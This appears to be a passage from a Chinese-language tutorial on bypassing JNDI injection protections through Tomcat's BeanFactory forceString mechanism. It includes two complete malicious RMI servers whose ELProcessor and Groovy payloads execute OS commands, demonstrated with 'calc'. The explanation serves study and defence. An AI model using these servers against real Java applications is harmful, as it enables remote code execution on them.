<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据 JNDI 的引用（Reference/ResourceRef）创建并配置一个 JavaBean 实例。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 主要流程：</span></span><br><span class="line"><span class="comment"> * 1) 判断 obj 是否为 ResourceRef；若不是则返回 null（交由其他工厂处理）。</span></span><br><span class="line"><span class="comment"> * 2) 从引用中取出目标 Bean 的类名，使用 TCL（线程上下文类加载器）或系统类加载器加载。</span></span><br><span class="line"><span class="comment"> * 3) 通过 Introspector 获取 Bean 的属性描述信息。</span></span><br><span class="line"><span class="comment"> * 4) 通过无参构造方法创建 Bean 实例。</span></span><br><span class="line"><span class="comment"> * 5) 解析特殊条目 &quot;forceString&quot;：允许指定某些属性强制使用 String 类型的 setter（包括自定义 setter 名）。</span></span><br><span class="line"><span class="comment"> * 6) 遍历引用中的各个 RefAddr 条目，按属性名匹配并将字符串值转换为目标属性的类型，再调用对应 setter 注入。</span></span><br><span class="line"><span class="comment"> * 7) 各类异常转换为 NamingException 抛出；对致命错误（ThreadDeath / VirtualMachineError）原样抛出。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj     描述 Bean 的引用对象（通常为 ResourceRef）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                                Hashtable&lt;?,?&gt; environment)</span></span><br><span class="line">    <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 仅处理 ResourceRef 类型；其他类型返回 null，让其它 ObjectFactory 试图处理</span></span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 将传入对象视为通用 JNDI 引用</span></span><br><span class="line">            <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference) obj;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 从引用中取出要实例化的 Bean 的类名</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">beanClassName</span> <span class="operator">=</span> ref.getClassName();</span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; beanClass = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 优先使用当前线程的上下文类加载器（TCL）</span></span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">tcl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="keyword">if</span> (tcl != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    <span class="comment">// 吞掉异常，后续尝试使用 Class.forName()</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 没有 TCL 时，使用系统类加载器</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    beanClass = Class.forName(beanClassName);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    <span class="comment">// 这里打印堆栈，便于诊断类加载问题</span></span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果仍然找不到类，抛出命名异常</span></span><br><span class="line">            <span class="keyword">if</span> (beanClass == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Class not found: &quot;</span> + beanClassName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过内省（Introspector）获取 Bean 的元信息（属性等）</span></span><br><span class="line">            <span class="type">BeanInfo</span> <span class="variable">bi</span> <span class="operator">=</span> Introspector.getBeanInfo(beanClass);</span><br><span class="line">            PropertyDescriptor[] pda = bi.getPropertyDescriptors();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过无参构造器创建 Bean 实例（要求目标类必须有 public 无参构造）</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> beanClass.getConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ===================== 处理 forceString =====================</span></span><br><span class="line">            <span class="comment">// forceString 是一个可选配置，用于指定某些属性使用“字符串参数”的 setter 来设置。</span></span><br><span class="line">            <span class="comment">// 形式：</span></span><br><span class="line">            <span class="comment">//   forceString = &quot;propA=customSetter, propB, propC=setXxx&quot;</span></span><br><span class="line">            <span class="comment">// - 若显式给出 method 名（形如 name=method），则使用该方法；</span></span><br><span class="line">            <span class="comment">// - 若只给出属性名（如 propB），则默认拼接标准 setter 名：set + 首字母大写。</span></span><br><span class="line">            <span class="type">RefAddr</span> <span class="variable">ra</span> <span class="operator">=</span> ref.get(<span class="string">&quot;forceString&quot;</span>);</span><br><span class="line">            Map&lt;String, Method&gt; forced = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            String value;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ra != <span class="literal">null</span>) &#123;</span><br><span class="line">                value = (String) ra.getContent();</span><br><span class="line">                Class&lt;?&gt;[] paramTypes = <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">1</span>];</span><br><span class="line">                paramTypes[<span class="number">0</span>] = String.class;</span><br><span class="line"></span><br><span class="line">                String setterName;</span><br><span class="line">                <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 逗号分隔多个配置项</span></span><br><span class="line">                <span class="keyword">for</span> (String param : value.split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">                    param = param.trim();</span><br><span class="line">                    <span class="comment">// 支持 &quot;name=method&quot; 或仅 &quot;name&quot; 两种形式</span></span><br><span class="line">                    index = param.indexOf(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        setterName = param.substring(index + <span class="number">1</span>).trim();</span><br><span class="line">                        param = param.substring(<span class="number">0</span>, index).trim(); <span class="comment">// 提取属性名</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// 未指定方法名则按标准 JavaBean 规则推导 setter</span></span><br><span class="line">                        setterName = <span class="string">&quot;set&quot;</span> +</span><br><span class="line">                                param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) +</span><br><span class="line">                                param.substring(<span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// 记录“强制使用 String 参数”的 setter 方法</span></span><br><span class="line">                        forced.put(param, beanClass.getMethod(setterName, paramTypes));</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (NoSuchMethodException | SecurityException ex) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(</span><br><span class="line">                                <span class="string">&quot;Forced String setter &quot;</span> + setterName +</span><br><span class="line">                                <span class="string">&quot; not found for property &quot;</span> + param);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// ================== 结束 forceString 处理 ===================</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历引用中的所有条目</span></span><br><span class="line">            Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (e.hasMoreElements()) &#123;</span><br><span class="line">                ra = e.nextElement();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// RefAddr 的 type 通常用来表示属性名</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">propName</span> <span class="operator">=</span> ra.getType();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 跳过一些特殊或内部使用的条目，不作为属性注入：</span></span><br><span class="line">                <span class="comment">// - 工厂类名 (factory)</span></span><br><span class="line">                <span class="comment">// - 作用域 (scope)</span></span><br><span class="line">                <span class="comment">// - 认证方式 (auth)</span></span><br><span class="line">                <span class="comment">// - 前面解释过的强制字符串 setter (forceString)</span></span><br><span class="line">                <span class="comment">// - 是否单例 (singleton)</span></span><br><span class="line">                <span class="keyword">if</span> (propName.equals(Constants.FACTORY) ||</span><br><span class="line">                    propName.equals(<span class="string">&quot;scope&quot;</span>) || propName.equals(<span class="string">&quot;auth&quot;</span>) ||</span><br><span class="line">                    propName.equals(<span class="string">&quot;forceString&quot;</span>) ||</span><br><span class="line">                    propName.equals(<span class="string">&quot;singleton&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 取出该属性要设置的字符串值</span></span><br><span class="line">                value = (String) ra.getContent();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 用于反射调用 setter 的参数数组（单参数）</span></span><br><span class="line">                Object[] valueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 若该属性在 forced 映射中，优先用“字符串参数”的 setter 直接注入</span></span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> forced.get(propName);</span><br><span class="line">                <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">                    valueArray[<span class="number">0</span>] = value;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        method.invoke(bean, valueArray); <span class="comment">// 🚨</span></span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IllegalAccessException |</span><br><span class="line">                             IllegalArgumentException |</span><br><span class="line">                             InvocationTargetException ex) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(</span><br><span class="line">                                <span class="string">&quot;Forced String setter &quot;</span> + method.getName() +</span><br><span class="line">                                <span class="string">&quot; threw exception for property &quot;</span> + propName);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">continue</span>; <span class="comment">// 已处理，进入下一个属性</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// [...]</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 全部属性处理完毕，返回配置好的 Bean</span></span><br><span class="line">            <span class="keyword">return</span> bean;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个函数主要逻辑如下：</p>
<ol>
<li>取出 <code>Reference</code> 类中的 <code>className</code> 属性作为目标 <code>Bean</code> 的类名，使用 TCL（线程上下文类加载器）或系统类加载器加载。</li>
<li>通过无参构造器创建 <code>Bean</code> 实例（要求目标类必须有 <code>public</code> 无参构造）。</li>
<li>遍历 <code>Reference</code> 中的各个 <code>RefAddr</code> 条目，按属性名匹配并将字符串值转换为目标属性的类型，再调用对应 setter 注入。</li>
</ol>
<p>因此如果我们可以通过构造一个 <code>Reference</code> 对象，使得在这个过程中，我们可以实例化任意一个本地类，然后调用这个实例的任意一个 setter 方法并传入任意字符串函数。</p>
<p>然而实际情况下很难有上述情景下能够实现 RCE 类，不过 <code>BeanFactory</code> 还有一个 forceString 机制，可以自定义 setter 方法名：</p>
<ol>
<li>先从 <code>Reference</code> 的 <code>RefAddr</code> 条目读出 <code>forceString</code> 的字符串，按逗号切分为若干 <code>item</code>。</li>
<li>对每个 <code>item</code>：<ul>
<li>形如 <code>name=method</code>：记录映射 <code>forced.put(name, beanClass.getMethod(method, String.class))</code>；</li>
<li>形如 <code>name</code>：推导 <code>method = &quot;set&quot; + capitalize(name)</code>，并同样要求该方法**单参数且类型为 <code>String</code>**，记录映射 <code>forced.put(name, beanClass.getMethod(method, String.class))</code>；</li>
</ul>
</li>
<li>按照键值对 <code>propName =&gt; value</code> 遍历 <code>Reference</code> 中的每个 <code>RefAddr</code>：<ul>
<li>跳过的保留键：<code>factory</code>、<code>scope</code>、<code>auth</code>、<code>forceString</code>、<code>singleton</code> <strong>不会</strong>作为属性处理。</li>
<li>若其 <code>type</code>（通常就是“属性名”）在 <code>forced</code> 映射里：<strong>直接</strong>调用那条方法：<code>method.invoke(bean, new Object[]&#123; value &#125;)</code>。</li>
</ul>
</li>
</ol>
<p>因此我们可以通过控制 <code>Reference</code> 对象中名称为 <code>forceString</code> 的 <code>RefAddr</code> 参数来实现：</p>
<ul>
<li>任意类的加载+实例化（必须要有 <code>public</code> 属性的无参构造函数）</li>
<li>任意函数调用且参数可控（函数只能有一个参数且类型为字符串）</li>
</ul>
<p>满足上述条件的函数有 <strong><code>javax.el.ELProcessor#eval</code></strong> 方法或 <strong><code>groovy.lang.GroovyShell#evaluate</code></strong> 方法</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="comment">// RMI 注册表端口，默认 1099</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PORT</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1) 构造一个 JNDI 引用对象（Reference），类型为 javax.el.ELProcessor</span></span><br><span class="line">        <span class="comment">//    这里使用的是 Tomcat 的 org.apache.naming.ResourceRef，并指定其 ObjectFactory 为 BeanFactory</span></span><br><span class="line">        <span class="comment">//    —— 对应前文的 getObjectInstance，会根据该 Reference 去“实例化并配置” ELProcessor。</span></span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(</span><br><span class="line">                <span class="string">&quot;javax.el.ELProcessor&quot;</span>,              <span class="comment">// 引用目标类：EL 表达式处理器</span></span><br><span class="line">                <span class="literal">null</span>,                                <span class="comment">// 工厂名相关参数（此处为 null）</span></span><br><span class="line">                <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,                              <span class="comment">// 地址类型/内容（此处用不到）</span></span><br><span class="line">                <span class="literal">true</span>,                                <span class="comment">// 是否可单例（与 BeanFactory 内部处理有关）</span></span><br><span class="line">                <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="comment">// 关键：指定由 BeanFactory 来“还原对象”</span></span><br><span class="line">                <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) forceString 机制：</span></span><br><span class="line">        <span class="comment">//    告诉 BeanFactory：对于名为 &quot;x&quot; 的“属性”，不要按常规属性找 setter，</span></span><br><span class="line">        <span class="comment">//    而是强制调用方法名为 &quot;eval&quot;、且形参为 String 的方法。</span></span><br><span class="line">        <span class="comment">//    —— 在 ELProcessor 上就会调用：eval(String script)</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 设置“属性”x 的字符串内容。由于 forceString 的存在，</span></span><br><span class="line">        <span class="comment">//    BeanFactory 会等价执行：elProcessor.eval(&lt;下方这个超长字符串&gt;);</span></span><br><span class="line">        <span class="comment">//    这段字符串在 EL 中通过反射和脚本引擎（Nashorn/JavaScript）最终触发进程执行。</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(</span><br><span class="line">                <span class="string">&quot;x&quot;</span>,</span><br><span class="line">                <span class="comment">// 说明：这是一个 EL 表达式字符串（外层 Java 字符串需要转义双引号）</span></span><br><span class="line">                <span class="comment">// 逻辑为：&quot;&quot; -&gt; getClass() -&gt; forName(&quot;javax.script.ScriptEngineManager&quot;)</span></span><br><span class="line">                <span class="comment">//          -&gt; newInstance() -&gt; getEngineByName(&quot;JavaScript&quot;)</span></span><br><span class="line">                <span class="comment">//          -&gt; eval(&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()&quot;)</span></span><br><span class="line">                <span class="comment">// 其中 eval 执行的是 JavaScript 代码，利用 Java 互操作去创建并启动 ProcessBuilder。</span></span><br><span class="line">                <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span></span><br><span class="line">        ));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 将上述 Reference 包装为可通过 RMI 传输/绑定的对象，然后绑定到名称 &quot;exploit&quot;</span></span><br><span class="line">        <span class="comment">//    客户端对 &quot;rmi://&lt;server&gt;:1099/exploit&quot; 做 JNDI lookup 时，会取回这个 Reference，</span></span><br><span class="line">        <span class="comment">//    随后 JNDI 会根据 ref 中指定的 BeanFactory 去“构造对象”，从而触发 eval(String)。</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">        LocateRegistry.createRegistry(PORT).rebind(<span class="string">&quot;exploit&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] RMI listening on 0.0.0.0:&quot;</span> + PORT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="comment">// 定义 RMI 注册表端口，默认为 1099</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PORT</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1) 构造一个 JNDI 引用对象（Reference），类型为 groovy.lang.GroovyClassLoader</span></span><br><span class="line">        <span class="comment">//    使用的是 Tomcat 的 org.apache.naming.ResourceRef，并指定其 ObjectFactory 为 BeanFactory</span></span><br><span class="line">        <span class="comment">//    —— getObjectInstance 会根据该 Reference 去“实例化并配置” GroovyClassLoader。</span></span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(</span><br><span class="line">                <span class="string">&quot;groovy.lang.GroovyClassLoader&quot;</span>,     <span class="comment">// 引用目标类：GroovyClassLoader，负责加载 Groovy 脚本</span></span><br><span class="line">                <span class="literal">null</span>,                                <span class="comment">// 工厂相关参数，这里为 null</span></span><br><span class="line">                <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,                              <span class="comment">// 地址类型和内容，在此处不使用</span></span><br><span class="line">                <span class="literal">true</span>,                                <span class="comment">// 是否为单例对象，默认为 true</span></span><br><span class="line">                <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="comment">// 使用 Tomcat 的 BeanFactory 来“还原对象”</span></span><br><span class="line">                <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) forceString 机制：告诉 BeanFactory，对于名为 &quot;x&quot; 的属性，不按常规 setter 进行设置，</span></span><br><span class="line">        <span class="comment">//    而是强制调用方法名为 &quot;parseClass&quot;、且接受 String 参数的方法。</span></span><br><span class="line">        <span class="comment">//    —— 在 GroovyClassLoader 上就会调用：parseClass(String script)</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=parseClass&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 设置“属性”x 的字符串内容。由于 forceString 的存在，BeanFactory 会等价执行：</span></span><br><span class="line">        <span class="comment">//    groovyClassLoader.parseClass(&lt;下方这个 Groovy 脚本&gt;);</span></span><br><span class="line">        <span class="comment">//    这段 Groovy 脚本通过 ASTTest 注解，执行 `Runtime.getRuntime().exec(&quot;calc&quot;)` 来启动计算器进程。</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> <span class="string">&quot;@groovy.transform.ASTTest(value=&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    assert java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)\n&quot;</span> +  <span class="comment">// 执行 calc 命令</span></span><br><span class="line">                <span class="string">&quot;&#125;)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;def x\n&quot;</span>;  <span class="comment">// 通过注解触发的脚本，构造一个 Groovy 类并运行</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 Groovy 脚本内容添加到引用中，作为属性 &quot;x&quot; 的值</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, script));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 将上述 Reference 包装为可通过 RMI 传输/绑定的对象，然后绑定到名称 &quot;exploit&quot;</span></span><br><span class="line">        <span class="comment">//    客户端对 &quot;rmi://&lt;server&gt;:1099/exploit&quot; 做 JNDI lookup 时，会取回这个 Reference，</span></span><br><span class="line">        <span class="comment">//    随后 JNDI 会根据 ref 中指定的 BeanFactory 去“构造对象”，从而触发 parseClass(String)。</span></span><br><span class="line">        <span class="comment">//    这时 Groovy 脚本通过 ASTTest 注解，执行在脚本内定义的 `exec(&quot;calc&quot;)`，进而触发进程执行。</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 启动本地 RMI 注册表，监听 1099 端口，将 &quot;exploit&quot; 绑定到 RMI 注册表中</span></span><br><span class="line">        LocateRegistry.createRegistry(PORT).rebind(<span class="string">&quot;exploit&quot;</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印 RMI 服务正在监听的端口，说明成功启动了 RMI 服务</span></span><br><span class="line">        System.out.println(<span class="string">&quot;[*] RMI listening on 0.0.0.0:&quot;</span> + PORT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>高版本 JDK 新增 <strong><code>jdk.jndi.object.factoriesFilter</code><strong>（系统或安全属性），用于匹配&#x2F;限制允许实例化的工厂类（语法沿用 <code>jdk.serialFilter</code> 的模式串）。这是这段校验逻辑的依据。该属性最初在</strong>JDK 17</strong>主线提供，同时<strong>回补到 JDK 11.0.11、8u291、7u301</strong> 等长期更新分支。</p>
